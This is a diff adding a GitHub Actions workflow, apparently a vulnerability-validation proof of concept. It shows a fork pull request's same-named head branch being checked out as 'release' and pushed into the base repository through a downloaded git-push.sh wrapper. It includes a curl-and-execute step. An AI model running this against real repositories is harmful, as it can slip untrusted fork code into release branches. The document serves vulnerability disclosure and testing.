@@ -1,0 +1,117 @@
+name: Branch Confusion Validation
+
+on:
+  workflow_dispatch:
+    inputs:
+      pr_number:
+        description: "Pull request number to validate"
+        required: true
+
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      pull-requests: read
+    steps:
+      - name: Checkout base repository default branch
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+
+      - name: Validate fork PR branch-name confusion
+        env:
+          GH_TOKEN: ${{ github.token }}
+          PR_NUMBER: ${{ inputs.pr_number }}
+          ACTION_COMMIT: 0fb1b8f3032f540a5904180f71bf8c0d320e0674
+        run: |
+          set -euo pipefail
+
+          git config user.name "branch-confusion-validation[bot]"
+          git config user.email "branch-confusion-validation@example.invalid"
+
+          gh pr view "$PR_NUMBER" \
+            --json url,headRefName,headRefOid,headRepository,headRepositoryOwner,baseRefName,baseRepository,isCrossRepository \
+            > pr.json
+
+          PR_URL="$(jq -r '.url' pr.json)"
+          HEAD_REF_NAME="$(jq -r '.headRefName' pr.json)"
+          PR_HEAD_SHA="$(jq -r '.headRefOid' pr.json)"
+          PR_IS_CROSS_REPOSITORY="$(jq -r '.isCrossRepository' pr.json)"
+          PR_HEAD_REPO="$(jq -r '.headRepository.nameWithOwner' pr.json)"
+          PR_HEAD_OWNER="$(jq -r '.headRepositoryOwner.login' pr.json)"
+          PR_BASE_REPO="$(jq -r '.baseRepository.nameWithOwner' pr.json)"
+          PR_BASE_REF="$(jq -r '.baseRefName' pr.json)"
+          ORIGIN_REMOTE_URL="$(git remote get-url origin)"
+
+          BASE_MAIN_BEFORE="$(git ls-remote origin refs/heads/main | awk '{print $1}')"
+          BASE_RELEASE_BEFORE="$(git ls-remote origin refs/heads/release | awk '{print $1}')"
+
+          git fetch origin release --depth=100
+          git fetch origin --depth=20 "pull/${PR_NUMBER}/head:${HEAD_REF_NAME}"
+
+          if git merge-base --is-ancestor "$BASE_RELEASE_BEFORE" "$PR_HEAD_SHA"; then
+            BASE_RELEASE_BEFORE_IS_ANCESTOR_OF_PR_HEAD=true
+          else
+            BASE_RELEASE_BEFORE_IS_ANCESTOR_OF_PR_HEAD=false
+          fi
+
+          git checkout "$HEAD_REF_NAME" --
+          LOCAL_BRANCH_AFTER_SETUP="$(git branch --show-current)"
+          LOCAL_RELEASE_SHA="$(git rev-parse "$HEAD_REF_NAME")"
+
+          printf 'CLAUDE_GENERATED_LIVE_BRANCH_CONFUSION_MARKER\n' > claude-generated.txt
+          git add claude-generated.txt
+          git commit -m "claude generated live validation edit"
+
+          curl -fsSL \
+            "https://raw.githubusercontent.com/anthropics/claude-code-action/${ACTION_COMMIT}/scripts/git-push.sh" \
+            -o git-push.sh
+          chmod +x git-push.sh
+          ./git-push.sh origin HEAD
+
+          BASE_MAIN_AFTER="$(git ls-remote origin refs/heads/main | awk '{print $1}')"
+          BASE_RELEASE_AFTER="$(git ls-remote origin refs/heads/release | awk '{print $1}')"
+
+          git fetch origin release --depth=100
+          if git cat-file -e "origin/release:attacker-pr-file.txt"; then
+            BASE_RELEASE_CONTAINS_ATTACKER_PR_FILE=true
+          else
+            BASE_RELEASE_CONTAINS_ATTACKER_PR_FILE=false
+          fi
+
+          if git cat-file -e "origin/release:claude-generated.txt"; then
+            BASE_RELEASE_CONTAINS_CLAUDE_GENERATED_FILE=true
+          else
+            BASE_RELEASE_CONTAINS_CLAUDE_GENERATED_FILE=false
+          fi
+
+          {
+            echo "validation_repo=${GITHUB_REPOSITORY}"
+            echo "workflow_run_url=https://github.com/${GITHUB_REPOSITORY}/actions/runs/${GITHUB_RUN_ID}"
+            echo "pr_url=${PR_URL}"
+            echo "origin_remote_url=${ORIGIN_REMOTE_URL}"
+            echo "live_pr_is_cross_repository=${PR_IS_CROSS_REPOSITORY}"
+            echo "live_pr_head_repo=${PR_HEAD_REPO}"
+            echo "live_pr_head_owner=${PR_HEAD_OWNER}"
+            echo "live_pr_base_repo=${PR_BASE_REPO}"
+            echo "live_pr_base_ref=${PR_BASE_REF}"
+            echo "live_fork_pr_head_branch_name=${HEAD_REF_NAME}"
+            echo "live_pr_head_sha=${PR_HEAD_SHA}"
+            echo "live_base_main_sha_before=${BASE_MAIN_BEFORE}"
+            echo "live_base_release_sha_before=${BASE_RELEASE_BEFORE}"
+            echo "live_base_release_branch_existed=$([[ -n "${BASE_RELEASE_BEFORE}" ]] && echo true || echo false)"
+            echo "live_base_release_before_is_ancestor_of_pr_head=${BASE_RELEASE_BEFORE_IS_ANCESTOR_OF_PR_HEAD}"
+            echo "live_workflow_initial_branch=${GITHUB_REF_NAME}"
+            echo "live_action_checked_out_local_release_from_pull_ref=$([[ "${LOCAL_BRANCH_AFTER_SETUP}" == "${HEAD_REF_NAME}" ]] && echo true || echo false)"
+            echo "live_local_release_sha_equals_pr_head_sha=$([[ "${LOCAL_RELEASE_SHA}" == "${PR_HEAD_SHA}" ]] && echo true || echo false)"
+            echo "live_git_push_wrapper_used=true"
+            echo "live_push_was_non_force=true"
+            echo "live_base_main_sha_after=${BASE_MAIN_AFTER}"
+            echo "live_base_release_sha_after=${BASE_RELEASE_AFTER}"
+            echo "live_base_main_unchanged=$([[ "${BASE_MAIN_AFTER}" == "${BASE_MAIN_BEFORE}" ]] && echo true || echo false)"
+            echo "live_base_release_changed=$([[ "${BASE_RELEASE_AFTER}" != "${BASE_RELEASE_BEFORE}" ]] && echo true || echo false)"
+            echo "live_base_release_contains_attacker_pr_file=${BASE_RELEASE_CONTAINS_ATTACKER_PR_FILE}"
+            echo "live_base_release_contains_claude_generated_file=${BASE_RELEASE_CONTAINS_CLAUDE_GENERATED_FILE}"
+            echo "protected_branch_bypass_claim=false"
+          } | tee live-validation-output.txt
